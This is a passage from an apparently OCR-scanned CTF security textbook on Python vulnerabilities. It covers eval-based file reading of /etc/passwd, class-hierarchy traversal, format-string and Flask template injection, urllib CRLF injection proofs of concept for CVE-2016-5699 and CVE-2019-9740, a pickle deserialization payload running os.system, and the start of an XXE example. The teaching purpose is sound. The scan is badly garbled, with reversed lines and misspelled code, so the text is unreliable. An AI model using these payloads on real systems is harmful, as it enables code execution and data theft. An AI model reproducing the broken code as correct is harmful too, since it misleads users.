ImportError : No module named os
File "", line 1, 1n 
Framewozks/Python.franevork
>> > > sys.modules [*os*] =*/usr/1oca1/Ce11ar/pythone2/2 . 7 . 15/
/Versions/2 . 7/1ib/python2 . 7/os pyc"
>>>> 1nport os
Similarly, setting this value to a controllable module can cause arbitrary code
execution.
If the controllable file is a ZIP file, you can also use zipimport.zipimporter to
achieve the above effect, without further ado.
---
## Page 233
218
3 Advanced Web Challenges
3.2.1.3 Using Inheritance, etc. to Find Objects
In Python, everything is an object, so we can use Python’s built-in methods to find an
object’s parent and child classes, such as [].  _class_ _ is  , [1  _class_
 _mro_ is (, ), and [].  _class_  _mro_[-1]. 
_subclasses_ _O will find all subclasses of object.
For example, item 40 is a file object (the actual index may be different and needs
to be identified dynamically) that can be used to read and write files.
>>> [ ,fclass_. __mro__[-1] . _subelasses_(1 [40]
read () .
##^n# User Database^n# \n . ----- *
buildingins
Functions that can be used without import, such as open and eval, belong to the
global module _ _builtins_ _- so you can try  _builtins_ _.open( ), etc. If the
function is deleted, you can also use reload( ) to retrieve it. If the function is deleted,
you can also use the reload( ) function to retrieve it.
>>> del _builtins_ open
>>>> _bui1tins_-open
Traceback (most recent call last) :
File "", line l, in 
uodo-suatnq>>> reload (_builtins)
uado-suyatrnq
3.2.1.4  Code Execution of Eval
lpeoueusp Xq uoud u 1 An ueo am pue *senue| Aue u snouauep t s! peAa auL
executing a piece of Python code with exec( ) (Python 2), execfile( ), eval( ),
compile( ), input( ) (Python 2), and so on.
open ("/etc/pasevd*) read (1
(1 andu >>> eval (*open (*/etc/passwd#) read () )
'## ^n# User Database\n# \n# ----- - *
---
## Page 234
3.2 Security Issues in Python
219
3.2.2Format Strings
CTF Python challenges cover injection of a template engine such as Jinja2. These
vulnerabilities are often introduced directly into server-side rendering of relevant
pages without filtering user input. By injecting some specific instruction formats into
the template engine, such as the response for {{1+1↓) is a 2, we can tell that the
vulnerability exists in the relevant Web page. Such features are not limited to Web
applications, but also exist in Python native strings.
3.2.2.1  Native % Strings
The following code implemented the login function. Because the input of the user is
not filtered, and is used as part of the argument to call the print function directly,
resulting in the disclosure of the user password.
passwd = raw_input ("Passvord: *)
userdata = {"user" : "jdoe", *passvord* : *secret* }
if passvd ! = userdata ["password"] :
pzint (*Password " + passud + " is wrong for user $ [user) a")  userdata
s(puomssed)%, Surd61 ≤q puomssed peau s,aasn sqp 1a3 ue3 1asn e °aqduex3 Jog
3.2.2.2 Format Method Related
The above example can also be rewritten using the format method (just the key
parts) :
pzint (*Passvord " + passwd + " is wrong for user (usex}*) . format
(**userdata)
If passwd = “(password)", you can obtain the actual password described in
3.2.2.1. In addition, the format method has other uses. For example, the
following code:
>>>> * (o . system) - format (os)
>>> 1nport os
It replaces 0 with a parameter in the format, and then proceeds to get the relevant
properties. This allows us to get sensitive information from the code.
The following quote is from http://lucumr.pocoo.org/2016/12/29/careful-with-
euo-s
---
## Page 235
220
3 Advanced Web Challenges
CONFIG = 
SECRET_KEY' : *super secret key
..
class Event (object) :
def _init__(self, id, level, message) :
self .id = id
self.1evel = leve1
self.nessage = nessage
def format_event (format_atring, event) :
return format_string. format (event=event)
If the format_string is {event.__init,
-_globals_[CONFIG][SECRET_KEY]),
sensitive information can be disclosed.
Theoretically, we can refer to the above to find the desired information through
the various inheritance relationships of classes.
3.2.2.3  The f-string in Python 3.6
f-strings is a new feature in Python 3.6 that gives strings the ability to retrieve
variables in the current context through the f tag. Such as:
>> a = "He11o*
pxo {）= = q>>> 1nport os
bin
etc
1ib
dev
hone
1inuxrc mnt
med1a
proc
run
sbin
tmp
var
'0'
root
s人s
>> f*{(1anbda x: x - 10) (100) }*
+ 06 
However, there is currently no way to convert an ordinary string to an f-string,
which means that the user may not have control over an f-string and may not be able
to utilize it.
---
## Page 236
3.2 Security Issues in Python
221
3.2.3PythonTemplateInjection
Many Python Web applications involve the use of templates, such as Tormado, Flask,
and Django. Sometimes the server needs to send dynamic data to the client. Instead
of using string concatenation, the template engine dynamically parses the template,
replaces the variables passed into the template engine, and finally presents them to
the user.
SSTI server template injection is caused by code that constructs template files
through unsafe string concatenation and puts too much trust in user input. Most
templating engines don't have a problem with themselves, so the focus of our audit is
to find a template that is constructed through string concatenation, and the user input
can affect the string concatenation process.
Flask is used as an example (like Tomado’s template syntax, where the focus is
only on finding key vulnerabilities). When dealing with sites suspected of having
template injection bugs, look first at functions such as render_* to see if their
parameters are under user control. If the template file name is controllable, for
example:
render_template (request args - get (*template_name′) , data)
Coordinate with uploading vulnerabilities, constructing templates, and complet-
ing template injections.
For the following example, we should focus on the render_template_string(tem-
Ss e  q pnso s n se s og (
where request.url has no filter and can be controlled directly by the user.
from flask import F1ask
from flask import render_template
from flask import render_cenplate_string
from flask import request
app = Flaak (__name__)
app,routex(′/test',methods= [*G&r*, *Posr′])
def test (l :
template = ***.
Oops! That page doesn′t exist , 
$s
111  (request ur1)
return_template_string(template)
if __nane.__ -* '_main__':
anxL = 6nqop·dde
app -run ()
---
## Page 237
222
3 Advanced Web Challenges
Then pass malicious code directly into the URL, such as “{ (self), and it will be
spliced into the template. Since the template will automatically look for the relevant
content in the server's rendering context when the template is rendered, populating it
into the template leads to the leakage of sensitive information and even the vulner-
ability of executing arbitrary code.
The easiest way to use this is to export the contextual variables with ( {variable }},
but a better way is to find a library or function that can be used directly, or to find an
object to execute the arbitrary code by means of inheritance, as mentioned above.
3.2.4URllibandSSRF
Python’s URllib library (urllib2 in Python 2, urllib in Python 3) has some HTTP
protocol stream injection vulnerabilities. This vulnerability can compromise Intranet
service security if an attacker can control Python code to access arbitrary urls or
allow Python code to access a malicious Web Server.
For such vulnerabilities, we mainly pay atention to whether the Python version
used by the server has corresponding vulnerabilities, and whether the target of the
attack will be affected by SSRF attacks. For example, a Python service downloaded
from a picture is used to attack an unencrypted Redis server deployed on the Intranet.
3.2.4.1CVE-2016-5699
CVE-2016-5699: A CRLF injection vulnerability exists in the HTTPConnection.
putheader function of urllib2 and urllib in versions of Python prior to 2.7.10 and 3.x
versions of Python prior to 3.4.4. A remote attacker could use the CRLF sequence in
 s sn peu d Aee ue p o  e
The value of the urlencode can be received during HTTP parsing of the host, and
the value of the host is then decoded and included in the HTTP data stream. During
this process, a newline character can be injected since there is no further validation or
encoding.
For example, run the following code in a vulnerable version of Python:
dmport sys
import ur11b
import ur11sb.error
import ur1lib.request
ur1 = sys.argv [1]
try:
info = ur11ib.request ,urlopen (ur1) .info ()
print (1nfo)
---
## Page 238
3.2 Security Issues in Python
223
except ur1lib.error,URLError as e:
print (e)
Its function is to receive a URL from a command line argument and then access
it. To see the HTTP headers sent during urllib requests, we use the nc command to
listen on the port to see the data received on the port.
nc -1 -p 12345
Send a normal request to 127.0.0.1:12345 and you can see that the HTTP
header is:
Accept -Encoding: identity
GEr /foo HTrP/1 . 1
User-Agent : Python-ur11ib/3 . 4
Host : 127.0.0.1:12345
Connection: c1ose
Then we use a constructed malicious address
- /poc-py http: //127, 0 , 0. 1vodvoaX- injected: $20headez+odv0ax-
leftover: v20: 12345/foo
The HTTP header can be seen to change to.
Accept -Encoding: identity
GEr /foo HTrP/1 . 1
User-Agent : Python-ur11ib/3 . 4
X-injected: header
Host : 127.0.0.1
x-leftover: :12345
Connection: c1ose
In contrast to the normal request mode, x-injected: header line is newly added,
 rs em e u so  uo se oo no sp yoee o am s
SSRFs aftack.
In addition to targeting IP addresses, the vulnerability also works when using
domain names, but requires inserting a null byte for DNS queries. For
but URL: http:/localhost%00%0d%0ax-bar:%20:12345/foo will parse properly
example, URL: http://localhost%0d%0ax-bar:%20:12345/foo will fail to parse,
and send request to 127.0.0.1.
Note that HTTP redirects can also take advantage of this vulnerability, and if the
ATTACKER provides a URL that is a malicious Web Server, the Server can redirect
to another URL, which can also result in protocol injection.
---
## Page 239
224
3 Advanced Web Challenges
3.2.4.2 CVE-2019-9740
CVE-2019-9740: Python urllib also has a CRLF injection vulnerability that allows
an attacker to perform a CRLF injection attack by controlling the URL parameters.
For example, we can reproduce the above CVE-2016-5699 by modifying the poc of
CVE-2016-5699.
import ur11b
import sys
import ur11sb.error
import ur1lib.request
host = 127. 0 , 0 . 1 :12347a=1 HTrP/1.1\r\nCRLP-injection: test\z^nTEST:
ur1 = *http: //*+ host + *:8080/test/7test=a*
1.2.3 "
tzy:
info =ur1lib.request ,urlopen (ur1) info [1
except ur11ib error URLError as e :
print (info)
print (e)
As you can see, the HTTP header is as follows:
GET /7a=1 HTTP/1 . 1
CRLF-injection: test
Accept -Encoding: identity
TEST : 123 : 8080/test/?test=a HTTP/1.1
Host : 127.0.0.1:1234
User-Agent : Python-ur11ib/3 . 7
Connect1on: close
3.2.5DeserializationinPython
Deserialization is implemented in every language, and Python is no exception. In the
deserialization process, because of the different implementation of deserialization
library. When the user input is too trusted, the user input data was directly sent into
the deserialization library, may cause arbitrary code execution problems. The Python
libraries that might be problematic are pickle, cPickle, and PyYAML, which should
focus on the following methods: Loads O, pickle.loadO, cpickle.load O, cpickle.
load O, yaml.loadO. The following focuses on the use of pickle, and other
deserialization methods are similar.
The  _reduce_ magic method is present in pickle to determine how the class is
deserialized. If the _reduce__, method returns a tuple of 2 to 5 entites, the contents
of the tuple will be used to serialize the objects of this class. The first two items are
---
## Page 240
3.2 Security Issues in Python
225
mandatory. The first item of the tuple's contents is a callable object, and the second
dxa umo o m ps s uoeesp  (pussso snxa
item is the argument when the callable object is called. For example, the payload that
When the user has control over the string that needs to be deserialized, passing in
payload can cause some problems. For example, os.system(?id*) is executed if the
result of the following deserialization is passed directly to pickle.loads().
import pick1e
import os
class test (object) :
def _reduce_ (self) :
return os.system, (*id*,)
payload = pickle. dumps (test ())
print (payload)
# b*\x80\,x03cnt\nayatem,ng\x00x\,x02\,x00\,x00^,x00idg,x01\,x85g\x02Rg
# python3 : Default Protocol version is 3, not compatible vith python 2 .
# python2: Default Protocol version is 0, python 3 can also be used .
\,x03 , 11
# cpos1x
# systen
#(s'id"
 p0
# p1
# tp2
# Rp3
There are many Opcodes in pickle, and through these Opcodes, we can construct
the call stack and implement many other functions. For example, code-Breaking
2018 involves a topic of deserialization. In the deserialization stage, the libraries
available for deserialization are limited, and  _reduce_ _ can only realize the call of
one function. Therefore, the content of deserialization needs to be written manually
to complete the purpose of bypassing filtering and arbitrary code execution.
3.2.6PythonXXE
Regardless of the language, there is always the possibility of XXE vulnerabilities
when it comes to XML processing, so when auditing a piece of code for XXE
vulnerabilities, the main thing to look for is the processing of XML and whether or
not the processing of extermal entities is disabled. For example, for a Web applica-
tion, the Content-type in the request header determines the type of user input, calls
the JISON handler for JSON and the XML handler for XML, and there happens to be
---
## Page 241
226
3 Advanced Web Challenges
no filtering of extermal entities in the process, which leads to the XXE problem when
the user enters XML
XXE is XML Extermal Entity injection. Extermal Entity is similar to the role of
“macro"d in the Word, the user can predefine an Entity, and then callit multiple times
in a document, or in multiple documents to call the same Entity. XML defines two
types of Entity injections Entity: Ordinary Entity, used in XML document:; Entity
parameter, used in DTD file.
The most common way to process XML in Python is the xml library, and we need
to pay attention to the parse method to see if the input XML processes the user input
directly and if the parsing for external entities is disabled or not. However, since
version 3.7.1 of Python, parsing of XML external entities is disabled by default, so it
m se uo Suruunu st apoo au req uosian uotd au on uoguae Aed o1 tuepodu s!
For specific xml inventory security issues, the reader can consult the official docu-
mentation of the xml library: https://docs.python.org/3/library.xml.html/.
The following code contains two common payloads for XXE attack, one for
reading files and the other for probing the intranet, and then parsing the XML therein
via Python. The code itself does not restrict the external entities, which leads to XXE
vulnerabilities.
# coding=utf -8
import xml .sax
x = ""
] >
&xxe ;
I  I
x1 = "*
] >
Sxxxe ; 
I  I
class MyContentHandler (xml sax, ContentHandler) :
def _init__(self) :
xml .sax.ContentHandler.__init_(self)
def startElenent (self, name, attrs) :
self .chars = **
def endElenent (self, name) :
print name, self .chara